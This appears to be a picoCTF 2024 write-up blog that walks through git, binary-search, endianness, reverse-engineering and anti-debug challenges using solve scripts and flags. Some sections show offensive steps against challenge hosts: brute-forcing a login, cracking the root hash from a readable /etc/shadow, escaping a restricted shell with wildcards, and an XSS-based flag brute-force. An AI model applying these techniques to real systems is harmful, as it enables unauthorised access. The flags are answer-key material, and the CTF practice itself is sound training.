### General Skills 10/10 :~

#### Super SSH
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/2132d3ae-f386-4e9f-a2b5-8b477ab3e875)


We are to ssh as `ctf-player` to `titan.picoctf.net` at port `50832` with password `84b12bae`

So I just did that and got the flag :)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/1ac9aae8-c943-4332-a423-d36682b8cffc)

#### Commitment Issues
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/e0011168-abf8-4f80-b76b-16d0b2a2d8b8)

We are given a zip file and after unzipping it showed a git directory in the `./drop-in` directory
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/6b7213b9-3563-4f2f-a95d-8d2494f69969)

Going over there shows this

From the challenge description we know the message was already deleted 

So I checked the git logs
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/079a61dd-5fc9-4c26-a3ea-df65d1984750)

The commit `87b85d7dfb839b077678611280fa023d76e017b8` was responsible in the creation of the flag

I checked it and got the flag
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/2fd81a96-e134-4e7b-9da6-da9c634e1af5)

We are given a zip file and after unzipping it showed a git directory in the `./drop-in` directory (same as the previous challenge)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/34c90ea7-fc66-40ae-a05b-6644d6f5370b)

#### Blame Game
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/71de47c9-4c08-4bb2-a1f2-e080abc57022)

Same as the previous ones
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/ea6af638-e302-4ad5-be19-1a0f19fb40d1)

But this time around when I checked the git log it was much
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/26530660-0a32-4f24-8ad6-e94200a4ce2f)

I checked from the first commit and saw this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/d908167e-e479-4715-910f-f7bb294ba50a)

The flag was in the author field

```
Flag: picoCTF{@sk_th3_1nt3rn_d2d29f22}
```

#### Collaborative Development
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/6ad2886e-892a-4843-a1c1-a6c75d574318)

Same as the previous one again
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/a1da72d6-f217-444d-9565-ca07db00de79)

In the git directory the python code there just prints out some word
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/1393fa25-9396-41c4-9b77-b1dccd94adcf)

Checking the git log shows this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/dbf779c1-a5d1-4836-ab83-c007f5970bdd)

So the flag isn't there

On noticing that we are in the main branch I decided to see if there are other branch

Checking it shows this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/66b80390-a9e0-4837-919a-46e17581dd8e)

I switched to `feature/part-1`
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/d656d670-7496-49d1-82bd-727e1b0adb58)

We can see that it had one portion of the flag

I repeated this process for the two branches left 
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/c08003f0-b407-40a0-9537-684d60079cc0)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/24a2e941-7838-463b-bc18-1910fe66868a)

With that I just concatenated the 3 portions of the flag to form the full flag

```
Flag: picoCTF{t3@mw0rk_m@k3s_th3_dr3@m_w0rk_2c91ca76}
```

#### Binhexa
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/0e81658e-00fe-4162-9abd-708b58bf8886)

We are given a remote instance to connect to

After connecting to it I got this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/54fc7ff3-c16e-4e04-a06a-ed534ef40920)

So we'll be given two binary numbers and we are to perform various operations on it 6 times

Also the operations to be performed changes
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/a98a80d9-05c9-4b99-b22d-4ed236005f8c)

Tbh during this ctf I solved this manually since the number of times we get question are just 6

I can't redo it here cause it's stressfull and i'm too lazy to write a script now :(

But the process was that i received the two binary string convert them to integer with python `int(binary, 2)` then perform the operation expected and send the result as a binary string

With that on the 6th trial I got the flag

```
Flag:
```

#### Binary Search
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/05190373-3744-42e8-9bc6-09b867672a86)

Reading the description we know that we need to guess a number with 1000 possibilities and we have just 10 trials

The challenge already hinted to use an Algorithm called Binary Search

We are given an attachment to download and on downloading it we see this bash script
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/643f4d6d-5ef7-4b9b-ad30-e44b1e7c9c78)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/ad544fe1-e9dc-4a23-91b7-8cdc6926f8ce)


```sh
#!/bin/bash

# Generate a random number between 1 and 1000
target=$(( (RANDOM % 1000) + 1 ))

echo "Welcome to the Binary Search Game!"
echo "I'm thinking of a number between 1 and 1000."

# Trap signals to prevent exiting
trap 'echo "Exiting is not allowed."' INT
trap '' SIGQUIT
trap '' SIGTSTP

# Limit the player to 10 guesses
MAX_GUESSES=10
guess_count=0

while (( guess_count < MAX_GUESSES )); do
    read -p "Enter your guess: " guess

    if ! [[ "$guess" =~ ^[0-9]+$ ]]; then
        echo "Please enter a valid number."
        continue
    fi

    (( guess_count++ ))

    if (( guess < target )); then
        echo "Higher! Try again."
    elif (( guess > target )); then
        echo "Lower! Try again."
    else
        echo "Congratulations! You guessed the correct number: $target"

        # Retrieve the flag from the metadata file
        flag=$(cat /challenge/metadata.json | jq -r '.flag')
        echo "Here's your flag: $flag"
        exit 0  # Exit with success code
    fi
done

# Player has exceeded maximum guesses
echo "Sorry, you've exceeded the maximum number of guesses."
exit 1  # Exit with error code to close the connection
```

So let's go over what it does:
- It generates a number between 1-1000
- It initilizes our maximum guess and guess counter to 10 and 0 respectively
- In a while loop where the condition checks if the guess counter is less than and equal to the maximum guess:
  - It reads in our input and checks if it's an integer using regex
  - Increments the guess counter by 1
  - If our guess is equal to the random generated number we get the flag
  - If our guess is less than the random generated number we get an error telling us that the target number is higher than our input
  - If our guess is greater than the random generated number we get an error telling us that the target number is lower than our input
- Once the while loop meets the condition it exits

Now that we are aware of what it does exactly we need to figure a way to guess the target value under the limited search sapce

To do that I implemented an algorithm called [Binary Search](https://en.wikipedia.org/wiki/Binary_search_algorithm)

It's basically an algorithm used to find the position of a value in a sorted array and it's time complexity is `O(log n)`

To test my solution I ran it locally

Here's the edited script

```bash
#!/bin/bash

# Generate a random number between 1 and 1000
target=689

echo "Welcome to the Binary Search Game!"
echo "I'm thinking of a number between 1 and 1000."

# Limit the player to 10 guesses
MAX_GUESSES=10
guess_count=0

while (( guess_count < MAX_GUESSES )); do
    read -p "Enter your guess: " guess

    if ! [[ "$guess" =~ ^[0-9]+$ ]]; then
        echo "Please enter a valid number."
        continue
    fi

    (( guess_count++ ))

    if (( guess < target )); then
        echo "Higher! Try again."
    elif (( guess > target )); then
        echo "Lower! Try again."
    else
        echo "Congratulations! You guessed the correct number: $target"

        # Retrieve the flag from the metadata file
        flag="fake_flag_for_testing"
        #flag=$(cat /challenge/metadata.json | jq -r '.flag')
        echo "Here's your flag: $flag"
        exit 0  # Exit with success code
    fi
done

# Player has exceeded maximum guesses
echo "Sorry, you've exceeded the maximum number of guesses."
exit 1  # Exit with error code to close the connection
```

And my solve [script](https://github.com/h4ckyou/h4ckyou.github.io/blob/main/posts/ctf/picoctf/scripts/2024/General/Binary%20Search/local.py)

```python
from pwn import *

context.log_level = 'debug'

io = process("./guessing_game.sh")

io.recvline()

def binarySearch(N):
    left, right = 0, N

    io.recvline()

    while left <= right:
        middle = left + (right - left) // 2

        io.sendline(str(middle))
        
        recv = io.recvline().decode().split()[0]

        if recv == "Lower!":
            right = middle - 1

        elif recv == "Higher!":
            left = middle + 1

        else:
            recv = io.recvline()
            return recv.decode()


N = 1000

binarySearch(N)

io.interactive()
```

Running it works!

Now I need to do the same remotely

But pwntools was always hanging
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/cf278520-7784-486c-a0c2-300260f2caca)

Because the number of guesses we can make is just 10 I decided to do it manually 😢
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/6e2e77e3-5e1d-49a6-9fcd-b825333a9ff8)

We see that the target value is lower than our input, so we set the new right pointer to `middle - 1` and update the new middle value
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/cf2d4aa8-b8fe-4632-b365-b9c86db90f4a)

Now it's higher so we set the left pointer to `middle + 1` and update the new middle value
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/9fc56703-cdb7-45b1-8627-ad0f7fe7a112)

Lower so we set the right pointer to `middle - 1` and update the new middle value
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/cafb7ca9-93dd-449c-a8b1-34b45b44b70d)

Hopefully you get the point...following the algorithm eventually made me get the right value

#### Endianness
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/6664aaad-85e2-4e15-ba32-33154d51acfa)

We are given a download file and after downloading it I saw it's a C program
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/f6490b6d-cd3d-4411-af59-166798b5d266)

The code is pretty much but the basic idea about it is that we will be given a word and we need to submit the little and big endian representation of the word

What is Endian? Endian refers to the order in which bytes are stored for multi-byte data types such as integers or floating-point numbers. There are two primary ways to represent these values in memory:
- Little Endian: The least significant byte (LSB) is stored at the lowest memory address, with the remaining bytes stored in increasing order of significance.
- Big Endian: The most significant byte (MSB) is stored at the lowest memory address, with the remaining bytes stored in decreasing order of significance.

With that said I wrote a solve [script](https://github.com/h4ckyou/h4ckyou.github.io/blob/main/posts/ctf/picoctf/scripts/2024/General/Endianness/solve.py)

Here's my solution

```python
from pwn import *

io = remote("titan.picoctf.net", "63041")

io.recvuntil(b"Word: ")
word = io.recvline().strip()

little = [hex(i)[2:] for i in word[::-1]]
little_end = ''.join(little)

big = [hex(i)[2:] for i in word]
big_end = ''.join(big)

io.sendline(little_end.encode())
io.sendline(big_end.encode())

io.recvuntil(b"is: ")
flag = io.recvline()

info(flag)
io.close()
```

We are given a remote instance to connect to

On doing that I got this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/668bef9b-2698-4753-a236-217b38764185)

I was confused at this point cause I have no idea what the password is and after trying silly guesses with no luck I decided to brute force

I wrote a script to achieve that this is it here: [brute](https://github.com/h4ckyou/h4ckyou.github.io/blob/main/posts/ctf/picoctf/scripts/2024/General/Don't%20You%20Love%20Banners/brute.py)

After running the script I got the password to be `My_Passw@rd_@1234`

Using that worked!
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/3c4ad114-88eb-4114-a735-9fbf2b4d988a)

After it worked we got 2 questions which was easily solved once you search it up and then finally we spawn into a bash shell

Looking through the file system I couldn't find the flag so I decided to escalate privilege

From doing some manual checks I found out that the `/etc/shadow` file is readable
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/54b26647-2c58-477c-b431-c261223a3b87)

We got the root hash which was crackable
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/79c6e40c-3123-4086-a4c8-847797fe5d85)

At this point I just switched to user `root` with password `iloveyou`
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/ee6e7917-0936-4f24-b197-990be0455abe)

The flag was in the root directory

```
Flag: picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_ed6f9c71}
```

#### SansAlpha

Connecting to the ssh instance I landed in a restricted shell
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/90b28b82-425b-4cf1-8415-07f83462fbdc)

I can't seem to use some certain words....that's what I thought at first

But after some trial I figured we can't use any characters except some certain symbols and digits

After spending some hours on this I decided to do some research and found this awesome video of LiveOverflow solving a similar challenge [here](https://www.youtube.com/watch?v=6D1LnMj0Yt0)

From that I found out that we can access files using `?` which represents like a wildcard in bash

First I need to know the path to the flag

I used an asterisk `*` on the current path and it showed this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/04fc7945-7f08-4e4b-bed1-b3cea7aab2b8)

And using an asterisk on that path showed that the flag is there
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/d944e0d8-3bf3-4055-8472-a73725e48dbb)

After some while my teammate was able to encode the flag using `base32` 
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/65cacb37-a124-4851-bc54-8ad1b5587be4)

Doing that gives the encoded flag
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/5b80c1fb-21df-4f67-abe8-42965128c303)

```
/???/???/????32  ~/??????/????.???
```

On decoding the value we got the flag

For this category I really didn't do much just two challenges my team mate solved the other challs there

In this challenge we are given an apk file

After downloading it I just unzipped it
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/10742098-4325-474c-b20d-6b34c78ed585)

I tried low hanging fruit things in this case search for a `*.txt` file to see if we can get the flag

Doing that indeed works but the flag was hex encoded which i just decoded

After downloading the file I saw the data is not recognizable by the `file` command
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/02b89b05-578b-4976-864e-0c0b680d4b35)

I uploaded it to cyberchef inorder to view it's hex dump
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/dae95e4b-dde2-40ad-b9d7-bd993c41b9de)

From looking at the first line from the hex dump result I noticed something peculiar

```
00000000  e0 ff d8 ff 46 4a 10 00 01 00 46 49 01 00 00 01  |àÿØÿFJ....FI....|
```

The file seems to a jpeg file but in this case the bytes are flipped 

Here's what I mean

Taking a look at the signature of a valid jpeg file shows this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/04aaa89a-fda9-4973-8303-1901bcb3171f)

```
FF D8 FF E0 00 10 4A 46 49 46 00 01
```

From this we can tell that for every 4 chunks it will basically flip it so that it's in is reverse order

At this point of figuring that I wrote a [script](https://github.com/h4ckyou/h4ckyou.github.io/blob/main/posts/ctf/picoctf/scripts/2024/Forensics/Endianess-V2/solve.py) to do the opposite

```python

def swap_chunks(data):
    chunks = []
    swapped_data = ""

    for i in range(0, len(data), 4):
        chunks.append(data[i:i+4])

    lt_idx = chunks[-1]
    chunks = chunks[:-1]
    swapped = b""

    for i in range(len(chunks)):
        swapped += chunks[i][::-1]
            

    return swapped

def main():
    input_file = 'challengefile'
    output_file = 'dump'

    with open(input_file, 'rb') as f:
        file_data = f.read()

    swapped_data = swap_chunks(file_data)


    with open(output_file, 'wb') as f:
        f.write(swapped_data)


if __name__ == "__main__":
    main()
```

Running that script gives a file and on checking the file type shows it's indeed a jpeg file

On viewing it gives the flag

Downloading the binary attached and checking the file type shows this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/5f04bf33-aea8-4ed6-bcbe-eb0564b5f144)

We see that it's packed with UPX so i just unpacked it
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/86aed00a-ab0b-4778-904d-242d5cbeab9d)

Running it shows that it expects a password
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/3332d339-bf2d-4648-9a28-88b2ee23e35d)

Since I don't know the password I decided to perform static reversing on the binary to see what it does

Loading it up in Ghidra and decompiling it takes few minutes because the binary is statically linked

But eventually after it does it's thing the main function shows up
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/c3e04867-bfbc-4f59-a532-3817bef0ccd4)

I didn't bother reading it cause I noticed that it eventually gives the flag which is encoded in hex

```c
puts("Password correct, please see flag: 7069636f4354467b5539585f556e5034636b314e365f42316e34526933535f31613561336633397d")
```

Decoding that hex value gives the flag

After downloading the binary I checked the file type
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/215ecef2-f4ea-4e1c-a940-3e06d68880f7)

Nothing special there except we're dealing with a 64bits binary which is dynamically linked and not stripped

I ran it to get an overview of what it does but it just exits
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/001a8d42-300f-49ea-9029-a71f92b6e20d)

I used Ghidra to load the binary but then I saw it's a C++ compiled binary then I immediately switched to IDA because it looks really ugly on Ghidra 🥲

Here's the main function
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/3da09a25-cbd6-4a5d-857b-4f739767b013)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/55175786-0973-496a-b9da-c0524a175745)

So we see some portion of the flag is being stored in memory

I just assummed that it builds up the flag in memory thus I switched to Dynamic Reversing

Loading it up and gdb and disassembling the main function
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/5e499d38-daff-4ce9-88ea-a7df357e5dc7)

Now I just set a breakpoint right before it calls `ret`
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/5ea11d61-5681-4fe2-85da-3025857f92bd)

Starting the process hits the breakpoint
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/3bd2b77e-9077-47e9-a82e-580c83a39009)

Now I just search for occurrence of `pico & mate` in memory
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/9784d445-dcbd-46b7-a794-73ddafa44f13)

With that I got the flag

```
Flag: picoCTF{wELF_d0N3_mate_7d29a538}

We are given a binary and a remote instance to connect to

Checking the file type of the binary shows this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/63c10565-ca43-4c1a-a267-c5647cf013ce)

So the same as usual but this type we have debug_info present 

Running the binary to get an overview of what it does shows this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/fab6d7e8-815e-4d93-bc23-49c82984f5d8)

Looks like time we need to get the password 

Loading it up in IDA to decompile it shows this as the main function
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/2db4c893-01a7-4472-bc22-b40e9050ed3d)

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char input[51]; // [rsp+0h] [rbp-A0h] BYREF
  char output[51]; // [rsp+40h] [rbp-60h] BYREF
  int random2; // [rsp+7Ch] [rbp-24h]
  int random1; // [rsp+80h] [rbp-20h]

  strcpy(output, "lxpyrvmgduiprervmoqkvfqrblqpvqueeuzmpqgycirxthsjaw");
  setvbuf(_bss_start, 0LL, 2, 0LL);
  printf("Enter the secret password: ");
  __isoc99_scanf("%50s", input);
  i = 0;
  len = strlen(output);
  secret1 = 85;
  secret2 = 51;
  secret3 = 15;
  fix = 97;
  while ( i <= 2 )
  {
    for ( i_0 = 0; i_0 < len; ++i_0 )
    {
      random1 = (secret1 & (i_0 % 255)) + (secret1 & ((i_0 % 255) >> 1));
      random2 = (random1 & secret2) + (secret2 & (random1 >> 2));
      input[i_0] = ((random2 & secret3) + input[i_0] - fix + (secret3 & (random2 >> 4))) % 26 + fix;
    }
    ++i;
  }
  if ( !memcmp(input, output, len) )
    printf("SUCCESS! Here is your flag: %s\n", "picoCTF{sample_flag}");
  else
    puts("FAILED!");
  return 0;
}
```

Looking at this we see that our input is going to pass through some sort of encryption scheme which is then eventually compared to the string stored in `output`

We can possibly brute force each character of the expected input since the encryption is deterministic 

But the way I solved this was by using an SMT solver called Z3

Here's my solve [script](https://github.com/h4ckyou/h4ckyou.github.io/blob/main/posts/ctf/picoctf/scripts/2024/Reverse%20Engineering/Classic%20Crackme%200x100/solve.py)

```python
from z3 import *

output = "mpknnphjngbhgzydttvkahppevhkmpwgdzxsykkokriepfnrdm"
secret1 = 85
secret2 = 51
secret3 = 15
fix = 97
i = 0

s = Solver()

arr = [BitVec(f'f_{i}', 8) for i in range(len(output))]
tmp = [BitVec(f'f_{i}', 8) for i in range(len(output))]

for v in arr:
    s.add(v > 0x60)
    s.add(v < 0x7f)
          
while i < 3:
    for j in range(len(output)):
        random1 = ((secret1 & (j % 255)) + (secret1 & ((j % 255) >> 1))) 
        random2 = ((random1 & secret2) + (secret2 & (random1 >> 2))) 
        val = (((random2 & secret3) + arr[j] - fix + (secret3 & (random2 >> 4))) % 26 + fix) 
        arr[j] = val

    i += 1

for j in range(len(output)):
    s.add(arr[j] == ord(output[j]))

if s.check() == sat:
    m = s.model()
    inp = ""

    for i in tmp:
        inp += chr(m[i].as_long())
    
    print(inp)
```

One thing to note there is that the constraint I used which let's z3 know the range of value which our input should be is within ascii lowercase letters plus some special characters

Running that generates the a string
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/6c315e90-c5d3-4c1e-890f-10b20dcd852f)

On the remote instance we can connect to it and send that generated string as the password to get the flag

After downloading the attached file and checking it I got this

This is a python bytecode 

Since I wasn't familiar with it I looked at the hint and saw they gave a python library
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/9a271787-f9da-4113-aec4-ba451c62da5e)

After I checked it out I saw it's a Disassembler for Python bytecode

From reading the documentation I saw various types of bytecode instructions: [here](https://docs.python.org/3/library/dis.html#python-bytecode-instructions)

I also played with it to see how it works here's an example
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/9ef59d5b-e131-4241-ba44-8c12e45ac461)

After I've tried disassembling some various operations I decided to start with reversing the bytecode

First it stores some values into an array called `input_list`
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/6f8d7c57-52ad-4b0c-bca0-2de674555fcf)

Note that the instruction `LOAD_CONST` pushes the value to the stack, and `STORE_NAME` implements `STACK.pop()` which basically moves the value on the stack to the variable we specified

Next it generates a string which is stored in variable `key_str` with value `J_o3t`
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/c3a0b80c-48e1-4022-baf9-6a0eb56a9899)

At this point I spent some time trying to understand this:

```

            156 CALL_METHOD              1
            158 POP_TOP
            160 JUMP_ABSOLUTE          134

              2 LOAD_FAST                0 (.0)
        >>    4 FOR_ITER                12 (to 18)

             16 JUMP_ABSOLUTE            4
        >>   18 RETURN_VALUE
```

But basically it will iterate over each character in `key_str` and store it's integer representation to a list `key_list` by using a list comprehension

```python
key_list = [ord(i) for i in key_str]
```

Next it extends the `key_list` till the length is equal that of the `input_list`

```python
while len(key_list) < len(input_list):
    key_list.extends(key_list)
```

The next part is this

             14 LOAD_FAST                2 (b)
             16 BINARY_XOR
             18 LIST_APPEND              2
             20 JUMP_ABSOLUTE            4
        >>   22 RETURN_VALUE

```

This is equivalent to doing

```python
result = [a ^ b for a, b in zip(input_list, key_list)]

result_text = ''.join(map(chr, result))
```

At this point we can get tell what this bytecode does is to decrypt the input_list using xor with the key as the key_str

I decided to just reimplement that but then I got this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/00e00bea-f6bc-4532-93f8-bbc560b1d531)

```python
input_list = [4, 54, 41, 0, 112, 32, 25, 49, 33, 3, 0, 0, 57, 32, 108, 23, 48, 4, 9, 70, 7, 110, 36, 8, 108, 7, 49, 10, 4, 86, 43, 106, 123, 89, 87, 18, 62, 47, 10, 78]
key_str = "J_o3t"

r = ''

for i in range(len(input_list)):
    xr = ord(key_str[i % len(key_str)]) ^ input_list[i]
    r += chr(xr)

print(r)
```

That doesn't work? 

Luckily because xor is reversible I decided to retrieve the key since we know the plaintext should start with `picoCTF` and we've got the ciphertext

Cool the key should be `t_Jo3`

Using that worked....here's the solve [script](https://github.com/h4ckyou/h4ckyou.github.io/blob/main/posts/ctf/picoctf/scripts/2024/Reverse%20Engineering/Weird%20Snake/solve.py)

#### WinAntiDbg0x100

This series of Windows Antidebug Challenges are not currently in picogym

But since I do have the files saved I'll go on ahead with the solution

I'll only be writing about WinAntiDbg0x100-0x200 I wasn't able to run the 3rd one on my host due to some DLL file missing so my teammate did that instead

For the first one we are given this set of files
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/5ea6db12-3fdd-4968-b1a6-2f924f856b00)

If we try to run it we get an error saying it needs to be run in a debugger

Loading it up in IDA we can generate the pseudocode 
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/c7d570d8-5f0e-4297-9a12-ba1e79a9a606)

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char Block; // [esp+0h] [ebp-8h]
  char Blocka; // [esp+0h] [ebp-8h]
  WCHAR *lpOutputString; // [esp+4h] [ebp-4h]

  if ( (unsigned __int8)sub_401130() )
  {
    OutputDebugStringW("\n");
    OutputDebugStringW("\n");
    sub_4011B0();
    if ( sub_401200() )
    {
      OutputDebugStringW(
        L"### Level 1: Why did the clever programmer become a gardener? Because they discovered their talent for growing a"
         " 'patch' of roses!\n");
      sub_401440(7);
      if ( IsDebuggerPresent() )
      {
        OutputDebugStringW(L"### Oops! The debugger was detected. Try to bypass this check to get the flag!\n");
      }
      else
      {
        sub_401440(11);
        sub_401530(dword_405404);
        lpOutputString = (WCHAR *)sub_4013B0(dword_405408);
        if ( lpOutputString )
        {
          OutputDebugStringW(L"### Good job! Here's your flag:\n");
          OutputDebugStringW(L"### ~~~ ");
          OutputDebugStringW(lpOutputString);
          OutputDebugStringW(L"\n");
          OutputDebugStringW(L"### (Note: The flag could become corrupted if the process state is tampered with in any way.)\n\n");
          j_j_free(lpOutputString);
        }
        else
        {
          OutputDebugStringW(L"### Something went wrong...\n");
        }
      }
    }
    else
    {
      OutputDebugStringW(L"### Error reading the 'config.bin' file... Challenge aborted.\n");
    }
    free(::Block);
  }
  else
  {
    sub_401060((char *)lpMultiByteStr, Block);
    sub_401060("### To start the challenge, you'll need to first launch this program using a debugger!\n", Blocka);
  }
  OutputDebugStringW(L"\n");
  OutputDebugStringW(L"\n");
  return 0;
}
```

From reading the code I could tell that this would open up the file `config.bin` performs some operation on it then makes sure we aren't running the executable in a debugger using the windows `IsDebuggerPresent` [api](https://learn.microsoft.com/en-us/windows/win32/api/debugapi/nf-debugapi-isdebuggerpresent) 

So that should "prevent" us from using a debugger but we can easily bypass this

Remember that the eax/rax holds the return value from a called function

From the disassembly that handles that check I saw this:
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/9c077a05-1f52-4f4e-bf01-3bc8f03a15ba)

```
call    ds:IsDebuggerPresent
test    eax, eax
jz      short loc_CB161B
```

From that we can see that after the call to `IsDebuggerPresent` it checks if the `eax` register is `0` and if it is we should get to the function that prints the flag

There are two ways I could go about this

First I set a breakpoint at `test eax, eax` then modified the eax register which was set to `1` to `0` which bypasses the check

But then the program exited immediately and made me not able to even get the flag

That's not an issue because if we take a look at the output tab we should see the flag there
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/79297dd9-db41-4149-8099-c9864c29b5bf)

The next way to go about this is to directly patch the `jz` opcode to a `jnz`

To do that in IDA click on the opcode then go to:

```
Edit --> Patch Program --> Assemble
```

![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/cba79b29-106a-45a7-ae01-36cbf906c0af)

Now I just replaced that with then pressed `Ok --> Cancel`

```
jnz      short loc_CB161B
``` 

Now time to save the patched binary 

```
Edit --> Patch Porgram --> Apply Patch to input file
```

With that the executable should be able to run bypassing the debugger check

Here's how it looked here after running the newly patched executable in IDA
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/9f997cf2-0070-4343-ad8a-c8de37ca22e5)

This time around we need to run it as admin

I opened IDA but with admin privilege this time around then loaded the executable to it

On generating the pseudocode I got this

  return 0;
}
```

Looking at the code I noticed this line:

```c
if ( (unsigned __int8)sub_4011D0() && IsDebuggerPresent() )
```

And the function `sub_4011D0()` basically trys to create a child process
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/71a697d5-4f10-4fe0-960f-86a1717343c9)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/69ecba64-5f6d-45c2-bcc0-641b8950c28e)

The program comparism checks if the value returned from calling `sub_4011D0()` is `1` and if `IsDebuggerPresent()` returns `1` then we get the "error debugging message"

Ok now that we know this we just need to make sure it doesn't meet this check

Looking at the assembly representation I saw this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/3472020d-5d8e-43f1-8f03-4fa4f30729b5)

```
push    offset aLevel2WhyDidTh ; "### Level 2: Why did the parent process"...
call    ds:OutputDebugStringW
push    3
call    sub_401090
add     esp, 4
call    sub_4011D0
movzx   edx, al
test    edx, edx
jnz     short loc_401832

call    ds:IsDebuggerPresent
test    eax, eax
jz      short loc_401847

loc_401847: ; get flag :)
push    1
call    sub_401090
add     esp, 4
mov     eax, dword_40509C
```

Ok the assembly looks pretty good and this are the two main parts:

```
part1:
    call    sub_4011D0
    movzx   edx, al
    test    edx, edx
    jnz     short loc_401832

part2:
    call    ds:IsDebuggerPresent
    test    eax, eax
    jz      short loc_401847
```

For the first part, after it calls the `sub_4011D0` function it sets `edx` to the value returned by the called function and it's stored in the `al` register, then it checks if `edx` is zero and finally it jumps if not zero to the function that handles the "error message" else it moves on to the `IsDebuggerPresent` check

From this we know that edx must equal 0 for we to bypass this check

For this I set a breakpoint at the `test edx, edx` instruction then I start the process

To set a breakpoint in IDA we can just click on `F2` at the instruction we want to break at or just right click and choose `add breakpoint`

Doing that I got this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/ac777e18-6259-4514-a2f8-cdeca6540b25)

Looking at the "General Registers" tab we see that `EDX` currently is `1`

So we need to patch that opcode from a `jnz --> jz` which is basically saying jump to the isdebugger check if edx is not zero

The next part is what we did in the previous `WinAntiDbg0x100` challenge

Just patch `jz --> jnz`

With that said after doing that I got the flag
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/a80d8c84-7e28-4620-942b-72c464690675)

I actually wasn't the one who solved this but I helped in writing the solve script since our solution takes quite some time before exfiltrating the flag

You can read up on how to solve it here and the other web challenges: [solution](https://krill-x7.github.io/2024/03/27/PicoCTF.html)

And here's my solve [script](https://github.com/h4ckyou/h4ckyou.github.io/blob/main/posts/ctf/picoctf/scripts/2024/Web/Elements/solve.py)

Basically what it does is to brute force the flag character by character using the xss payload which causes the chrome browser to crash once the character being guessed is right

